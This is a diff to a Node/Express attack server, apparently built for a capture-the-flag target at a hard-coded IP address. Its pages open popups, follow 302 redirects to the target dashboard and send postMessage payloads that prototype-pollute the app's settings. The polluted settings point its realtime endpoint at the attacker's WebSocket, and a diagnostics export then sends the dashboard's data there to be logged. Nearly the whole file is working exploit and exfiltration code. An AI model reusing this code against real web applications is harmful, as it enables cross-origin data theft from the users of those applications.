@@ -7,80 +7,114 @@ expressWs(app);
 const PORT = process.env.PORT || 10000;
 const TARGET = 'http://34.118.127.209:35666/';
 
-// ── GET / ── landing: open same-origin helper popup, then navigate self to dashboard
+// ── 302 redirect to dashboard (key trick: browser follows 302 cross-protocol) ──
+app.get('/go', (req, res) => {
+  res.redirect(302, TARGET);
+});
+
+// ── GET / ── landing page: two parallel approaches ──
 app.get('/', (req, res) => {
+  const host = req.headers.host || req.hostname;
+  const wsUrl = 'wss://' + host + '/ws';
   res.type('html').send(`<!DOCTYPE html>
-<html><body>
+<html>
+<head><meta http-equiv="refresh" content="2;url=/go"></head>
+<body>
 <script>
-// 1. Open helper popup (HTTPS→HTTPS = guaranteed to load)
-var h = window.open(location.origin + '/helper');
-// 2. Navigate THIS window to the dashboard (top-level HTTPS→HTTP = allowed)
-//    After this, helper's window.opener points to the dashboard
-setTimeout(function(){ location.href = '${TARGET}'; }, 500);
+function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
+L('landing');
+
+// ═══ APPROACH A: popup via 302 redirect ═══
+// window.open('/go') → HTTPS same-origin (always works)
+// Server responds 302 → http://dashboard (browser follows cross-protocol)
+// We keep the popup reference and postMessage to it
+var pop = null;
+try {
+  pop = window.open('/go');
+  L('pop='+(pop?'ok':'null'));
+} catch(e){ L('pop_err='+e.message); }
+
+// ═══ APPROACH B: helper popup + navigate self via 302 ═══
+// Helper popup stays on HTTPS, we navigate to dashboard via meta-refresh→/go→302
+// Helper's window.opener becomes the dashboard
+var helper = null;
+try {
+  helper = window.open('/helper');
+  L('helper='+(helper?'ok':'null'));
+} catch(e){ L('helper_err='+e.message); }
+
+// ═══ Attack popup (Approach A) ═══
+var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');
+
+function attackPop(){
+  if(!pop||pop.closed){L('pop_closed');return;}
+  try{L('pop.len='+pop.length);}catch(e){L('pop.len=err');}
+  try{
+    pop.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
+    L('a_pollute');
+  }catch(e){L('a_pollute_err='+e.message);}
+  setTimeout(function(){
+    try{
+      pop.postMessage({type:'diagnostics:export'},'*');
+      L('a_trigger');
+    }catch(e){L('a_trigger_err='+e.message);}
+  },600);
+}
+
+[2000,4000,6000,8000,11000,15000].forEach(function(d){setTimeout(attackPop,d);});
 </script>
 </body></html>`);
 });
 
-// ── GET /helper ── same-origin popup that attacks window.opener (= dashboard)
+// ── GET /helper ── Approach B: attacks window.opener (which navigated to dashboard via meta-refresh→302) ──
 app.get('/helper', (req, res) => {
   const host = req.headers.host || req.hostname;
   const wsUrl = 'wss://' + host + '/ws';
   res.type('html').send(`<!DOCTYPE html>
 <html><body>
 <script>
-function L(m){
-  try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}
-}
+function L(m){try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}}
 L('helper_loaded');
 
-function tryAttack(){
-  if(!window.opener){L('no_opener');return false;}
+var PP = JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');
 
-  // Diagnostic: check if opener navigated cross-origin (= dashboard loaded)
-  var crossOrigin=false;
-  try{var x=window.opener.location.href;L('opener_sameorigin='+x);}
-  catch(e){crossOrigin=true;L('opener_crossorigin');}
+function attack(){
+  if(!window.opener){L('h_no_opener');return;}
+  var co=false;
+  try{var x=window.opener.location.href;L('h_same='+x);}catch(e){co=true;L('h_cross');}
+  try{L('h_len='+window.opener.length);}catch(e){L('h_len=err');}
 
-  var len=-1;
-  try{len=window.opener.length;}catch(e){L('len_err');}
-  L('opener.len='+len);
-
-  // len=1 means dashboard loaded (it has 1 iframe)
-  // But try even if len=0, in case iframe hasn't loaded yet
-  if(!crossOrigin){return false;} // opener hasn't navigated to dashboard yet
-
-  // Prototype pollution via JSON.parse (__proto__ = own data property)
-  var inner=JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');
-  window.opener.postMessage({type:'prefs:update',payload:{theme:inner}},'*');
-  L('pollute_ok');
-
+  // ALWAYS try postMessage regardless of origin (postMessage works cross-origin)
+  try{
+    window.opener.postMessage({type:'prefs:update',payload:{theme:PP}},'*');
+    L('h_pollute');
+  }catch(e){L('h_pollute_err='+e.message);}
   setTimeout(function(){
-    window.opener.postMessage({type:'diagnostics:export'},'*');
-    L('trigger_ok');
-  },500);
-  return true;
+    try{
+      window.opener.postMessage({type:'diagnostics:export'},'*');
+      L('h_trigger');
+    }catch(e){L('h_trigger_err='+e.message);}
+  },600);
 }
 
-// Poll: wait for dashboard to load, then attack repeatedly
-var attempts=0;
+var n=0;
 var iv=setInterval(function(){
-  attempts++;
-  var ok=tryAttack();
-  L('attempt_'+attempts+'_ok='+ok);
-  if(attempts>=25)clearInterval(iv);
+  n++;
+  attack();
+  if(n>=20)clearInterval(iv);
 },1500);
 </script>
 </body></html>`);
 });
 
-// ── GET /log ── beacon logger
+// ── GET /log ── beacon logger ──
 app.get('/log', (req, res) => {
   var raw = req.originalUrl.replace(/^\/log\?/,'').replace(/&_=\d+$/,'');
   console.log('[beacon]', decodeURIComponent(raw));
   res.status(204).end();
 });
 
-// ── WS /ws ── receive exfiltrated diagnostics bundle
+// ── WS /ws ── receive exfiltrated diagnostics ──
 app.ws('/ws', (ws, req) => {
   console.log('[ws] connection from', req.ip);
   ws.on('message', (data) => {
